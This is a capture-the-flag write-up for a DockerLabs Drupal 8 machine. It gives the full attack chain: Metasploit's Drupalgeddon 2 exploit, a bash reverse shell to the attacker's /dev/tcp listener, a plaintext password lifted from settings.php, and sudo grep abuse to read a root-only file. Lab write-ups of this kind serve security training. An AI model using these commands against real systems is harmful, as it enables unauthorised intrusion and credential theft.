# findyourstyle

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| findyourstyle | El Pingüino de Mario | easy/facil | dockerlabs |

**Summary:** The findyourstyle machine was a Drupal 8 exploitation challenge combining the Drupalgeddon 2 remote code execution vulnerability with a credential recovery from a database configuration file and a creative `sudo grep` abuse to read a root-owned secret file. Nmap identified a single port 80 running Apache with Drupal 8 detected by the HTTP generator header and a lengthy `robots.txt`. The Drupal version was confirmed visually from the web interface. Metasploit's `drupal_drupalgeddon2` module exploited the vulnerability directly, opening a Meterpreter session as `www-data`. A `shell` command within Meterpreter issued a bash reverse shell back to a waiting netcat listener, and the TTY was stabilised using `script`. User enumeration revealed one interactive account `ballenita`. A recursive grep through the Drupal web root for the username uncovered a plaintext password `ballenitafeliz` in `sites/default/settings.php`. A `su - ballenita` succeeded. As `ballenita`, `sudo -l` showed passwordless access to `/bin/ls` and `/bin/grep` as root. Running `sudo ls -la /root` revealed a file named `secretitomaximo.txt`. Running `sudo grep "" /root/secretitomaximo.txt` read its contents, yielding the root password `nobodycanfindthispasswordrootrocks`. A final `su - root` completed the escalation.

---

## Reconnaissance

**1. Machine Deployment**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/findyourstyle]
└─$ sudo bash auto_deploy.sh findyourstyle.tar 

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /"""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

**2. Port Scan**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/findyourstyle]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-02 07:41 +0700
Nmap scan report for bypass403.pw (172.17.0.2)
Host is up (0.0000080s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: Drupal 8 (https://www.drupal.org)
|_http-title: Welcome to Find your own Style | Find your own Style
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/ 
| /comment/reply/ /filter/tips/ /node/add/ /search/ /user/register/ 
| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
|_/index.php/comment/reply/
|_http-server-header: Apache/2.4.25 (Debian)
MAC Address: 7A:03:D0:A3:1B:BD (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.71 seconds
```

Only port 80 was open. The HTTP generator header immediately identified Drupal 8, and the `robots.txt` exposed a broad set of administrative paths.

---

## Initial Access

### Drupalgeddon 2 RCE via Metasploit

**3. Inspecting the Web Application and Confirming the Version**

The web application served the "Find your own Style" Drupal 8 site. The Drupal version was confirmed directly from the interface.

![](image.png)

![](image-1.png)

**4. Exploiting Drupalgeddon 2 with Metasploit**

Metasploit was launched and searched for Drupal 8 exploits. The `drupal_drupalgeddon2` module (SA-CORE-2018-002, also known as Drupalgeddon 2) was selected, configured with the target and listener addresses, and run.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/findyourstyle]
└─$ msfconsole -q                                
msf > search drupal 8

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   1     \_ target: Automatic (PHP In-Memory)         .                .          .      .
   2     \_ target: Automatic (PHP Dropper)           .                .          .      .
   3     \_ target: Automatic (Unix In-Memory)        .                .          .      .
   4     \_ target: Automatic (Linux Dropper)         .                .          .      .
   5     \_ target: Drupal 7.x (PHP In-Memory)        .                .          .      .
   6     \_ target: Drupal 7.x (PHP Dropper)          .                .          .      .
   7     \_ target: Drupal 7.x (Unix In-Memory)       .                .          .      .
   8     \_ target: Drupal 7.x (Linux Dropper)        .                .          .      .
   9     \_ target: Drupal 8.x (PHP In-Memory)        .                .          .      .
   10    \_ target: Drupal 8.x (PHP Dropper)          .                .          .      .
   11    \_ target: Drupal 8.x (Unix In-Memory)       .                .          .      .
   12    \_ target: Drupal 8.x (Linux Dropper)        .                .          .      .
   13    \_ AKA: SA-CORE-2018-002                     .                .          .      .
   14    \_ AKA: Drupalgeddon 2                       .                .          .      .
   15  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   16  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   17    \_ target: PHP In-Memory                     .                .          .      .
   18    \_ target: Unix In-Memory                    .                .          .      .
   19  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   20  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution


Interact with a module by name or index. For example info 20, use 20 or use exploit/unix/webapp/php_xmlrpc_eval

msf > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
msf exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST 172.17.0.1
LHOST => 172.17.0.1
msf exploit(unix/webapp/drupal_drupalgeddon2) > run
[*] Started reverse TCP handler on 172.17.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Detected vulnerable version 8
[*] Sending stage (45739 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (172.17.0.1:4444 -> 172.17.0.2:57784) at 2026-08-02 07:45:44 +0700

meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command                   Description
    -------                   -----------
    cat                       Read the contents of a file to the screen
    cd                        Change directory
    checksum                  Retrieve the checksum of a file
    chmod                     Change the permissions of a file
    cp                        Copy source to destination
    del                       Delete the specified file
    dir                       List files (alias for ls)
    download                  Download a file or directory
    edit                      Edit a file
    getlwd                    Print local working directory (alias for lpwd)
    getwd                     Print working directory
    lcat                      Read the contents of a local file to the screen
    lcd                       Change local working directory
    ldir                      List local files (alias for lls)
    lls                       List local files
    lmkdir                    Create new directory on local machine
    lpwd                      Print local working directory
    ls                        List files
    mkdir                     Make directory
    mv                        Move source to destination
    pwd                       Print working directory
    rm                        Delete the specified file
    rmdir                     Remove directory
    search                    Search for files
    upload                    Upload a file or directory


Stdapi: Networking Commands
===========================

    Command                   Description
    -------                   -----------
    arp                       Display the host ARP cache
    portfwd                   Forward a local port to a remote service
    resolve                   Resolve a set of host names on the target


Stdapi: System Commands
=======================

    Command                   Description
    -------                   -----------
    execute                   Execute a command
    getenv                    Get one or more environment variable values
    getpid                    Get the current process identifier
    getuid                    Get the user that the server is running as
    kill                      Terminate a process
    localtime                 Displays the target system local date and time
    pgrep                     Filter processes by name
    pkill                     Terminate processes by name
    ps                        List running processes
    shell                     Drop into a system command shell
    sysinfo                   Gets information about the remote system, such as OS


Stdapi: Audio Output Commands
=============================

    Command                   Description
    -------                   -----------
    play                      play a waveform audio file (.wav) on the target system

For more info on a specific command, use <command> -h or help <command>.

meterpreter > shell
Process 33 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A Meterpreter session was opened as `www-data`. The `shell` command dropped into a system shell and confirmed identity. To obtain a more stable interactive bash session, a reverse shell was issued back to a separate netcat listener.

### Upgrading to an Interactive Bash Shell

**5. Issuing a Bash Reverse Shell from Meterpreter**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/findyourstyle]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

```bash
/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'
```

**6. Catching the Shell and Stabilising the TTY**

```bash
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 50398
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fb6f22660ae6:/var/www/html$ which python3
which python3
www-data@fb6f22660ae6:/var/www/html$ which script
which script
/usr/bin/script
www-data@fb6f22660ae6:/var/www/html$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
www-data@fb6f22660ae6:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/findyourstyle]
└─$ stty raw -echo; fg 
[1]  + continued  nc -lvnp 4444

www-data@fb6f22660ae6:/var/www/html$ export SHELL=/bin/bash
www-data@fb6f22660ae6:/var/www/html$ export TERM=xterm
www-data@fb6f22660ae6:/var/www/html$ stty rows 80 cols 130
```

A stable TTY shell was obtained as `www-data`.

---

## Lateral Movement

### Credential Recovery from settings.php

**7. User Enumeration and Grepping the Web Root**

User enumeration revealed one interactive account `ballenita`. A recursive grep through the web root for that username uncovered a plaintext credential in the Drupal database configuration file.

```bash
www-data@fb6f22660ae6:/var/www/html$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
ballenita:x:1000:1000:ballenita,,,:/home/ballenita:/bin/bash
www-data@fb6f22660ae6:/var/www/html$ ls -la /home
total 12
drwxr-xr-x 1 root      root      4096 Oct 16  2024 .
drwxr-xr-x 1 root      root      4096 Aug  2 00:37 ..
drwxr-xr-x 2 ballenita ballenita 4096 Oct 16  2024 ballenita
www-data@fb6f22660ae6:/var/www/html$ ls -la /home/ballenita/
total 20
drwxr-xr-x 2 ballenita ballenita 4096 Oct 16  2024 .
drwxr-xr-x 1 root      root      4096 Oct 16  2024 ..
-rw-r--r-- 1 ballenita ballenita  220 Oct 16  2024 .bash_logout
-rw-r--r-- 1 ballenita ballenita 3526 Oct 16  2024 .bashrc
-rw-r--r-- 1 ballenita ballenita  675 Oct 16  2024 .profile
```

```bash
www-data@fb6f22660ae6:/var/www/html$ grep -r "ballenita" . 2>/dev/null
Binary file ./sites/default/files/.ht.sqlite matches
./sites/default/settings.php: *   'username' => 'ballenita',
./sites/default/settings.php: *   'password' => 'ballenitafeliz', //Cuidadito cuidadín pillin
^C
www-data@fb6f22660ae6:/var/www/html$ su - ballenita
Password: 
ballenita@fb6f22660ae6:~$ id;whoami
uid=1000(ballenita) gid=1000(ballenita) groups=1000(ballenita)
ballenita
```

The plaintext password `ballenitafeliz` was exposed in a commented block within `settings.php`. The `su - ballenita` succeeded immediately.

---

## Privilege Escalation

### sudo grep to Read root's Secret File

**8. Checking sudo Permissions and Listing /root**

A `sudo -l` check revealed that `ballenita` could run `/bin/ls` and `/bin/grep` as root without a password.

```bash
ballenita@fb6f22660ae6:~$ sudo -l
Matching Defaults entries for ballenita on fb6f22660ae6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ballenita may run the following commands on fb6f22660ae6:
    (root) NOPASSWD: /bin/ls, /bin/grep
ballenita@fb6f22660ae6:~$ sudo -u root /bin/ls -la /root
total 28
drwx------ 1 root root 4096 Oct 16  2024 .
drwxr-xr-x 1 root root 4096 Aug  2 00:37 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 2 root root 4096 Oct 16  2024 .nano
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-r--r-- 1 root root  169 Mar 14  2018 .wget-hsts
-rw-r--r-- 1 root root   35 Oct 16  2024 secretitomaximo.txt
```

The `ls` output revealed a file named `secretitomaximo.txt` in root's home directory. `sudo grep` was used to read it, as `grep ""` with an empty pattern matches every line.

**9. Reading the Root Password File and Escalating**

```bash
ballenita@fb6f22660ae6:~$ sudo -u root grep "" /root/secretitomaximo.txt
nobodycanfindthispasswordrootrocks
ballenita@fb6f22660ae6:~$ su - root
Password: 
root@fb6f22660ae6:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
fb6f22660ae6
```

The root password `nobodycanfindthispasswordrootrocks` was disclosed and `su - root` completed the escalation to a full root shell.

---

## Attack Chain Summary
1. **Reconnaissance**: Nmap identified only port 80 running Apache. The HTTP generator header disclosed Drupal 8 immediately, and a 22-entry `robots.txt` exposed administrative paths. The Drupal version was confirmed visually from the web interface.
2. **Exploitation**: Metasploit's `drupal_drupalgeddon2` module exploited the Drupalgeddon 2 Forms API Property Injection vulnerability (SA-CORE-2018-002), opening a Meterpreter session as `www-data`. A bash reverse shell was issued from within Meterpreter to a netcat listener, and the TTY was stabilised using `script`.
3. **Credential Recovery**: User enumeration revealed one interactive account `ballenita`. A recursive grep through the Drupal web root for that username found the plaintext password `ballenitafeliz` in a commented block within `sites/default/settings.php`. A `su - ballenita` succeeded.
4. **sudo Abuse**: A `sudo -l` check showed passwordless access to `/bin/ls` and `/bin/grep` as root. Running `sudo ls -la /root` revealed a file named `secretitomaximo.txt`.
5. **Privilege Escalation**: `sudo grep "" /root/secretitomaximo.txt` read the file's contents, yielding the root password `nobodycanfindthispasswordrootrocks`. A final `su - root` produced a clean root shell.
